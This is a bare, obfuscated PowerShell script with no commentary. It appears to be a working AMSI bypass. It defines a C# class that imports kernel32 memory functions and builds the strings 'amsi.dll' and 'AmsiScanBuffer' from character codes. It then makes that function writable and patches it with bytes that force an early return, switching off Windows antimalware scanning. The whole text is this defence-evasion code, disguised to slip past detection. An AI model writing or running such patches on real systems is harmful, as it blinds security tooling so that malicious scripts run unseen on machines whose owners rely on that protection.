$oZrbf4W_b8_ = @"
using System;
using System.Runtime.InteropServices;
public class oZrbf4W_b8_ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr y1_WDr08Qz8NnA, string Fo78ZbX4);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr kLQwSrI8S07, UIntPtr IEQmICX_BIC, uint s5N, out uint vBCS2BvTqOk48h);
}
"@

Add-Type $oZrbf4W_b8_

$P4OuMWGLx_PbmLTnXQ = [oZrbf4W_b8_]::LoadLibrary("$(('àms'+'î.d'+'ll').nORMaLizE([ChaR]([BYTe]0x46)+[chAr](111+75-75)+[chAr](114+22-22)+[CHAR](109*96/96)+[ChAr]([BytE]0x44)) -replace [cHaR]([bYTE]0x5c)+[CHAR](112)+[cHAr](43+80)+[char](77)+[chAR]([BYTE]0x6e)+[cHaR]([bYTe]0x7d))")
$YwUXl = [oZrbf4W_b8_]::GetProcAddress($P4OuMWGLx_PbmLTnXQ, "$([ChaR](65*60/60)+[chAr](109*19/19)+[char](9+106)+[CHAr]([ByTe]0x69)+[cHaR](67+16)+[ChAR]([BYTE]0x63)+[cHAr]([bYte]0x61)+[CHAR](2+108)+[ChaR]([BYTe]0x42)+[chAR](117*108/108)+[chAr]([byTe]0x66)+[CHAR](69+33)+[cHAr]([BYTE]0x65)+[Char]([BYTE]0x72))")
$p = 0
[oZrbf4W_b8_]::VirtualProtect($YwUXl, [uint32]5, 0x40, [ref]$p)
$GWG23SIme2wtcIaaZB = "0xB8"
$CDUG4hCFT8g9WkaTLre = "0x57"
$g059KoETUpZ7h = "0x00"
$QWcN = "0x07"
$V_wdXF = "0x80"
$UAmXeWHlCRp_8DznSbPd = "0xC3"
$pSBacUBdOzrwlDTu = [Byte[]] ($GWG23SIme2wtcIaaZB,$CDUG4hCFT8g9WkaTLre,$g059KoETUpZ7h,$QWcN,+$V_wdXF,+$UAmXeWHlCRp_8DznSbPd)
[System.Runtime.InteropServices.Marshal]::Copy($pSBacUBdOzrwlDTu, 0, $YwUXl, 6)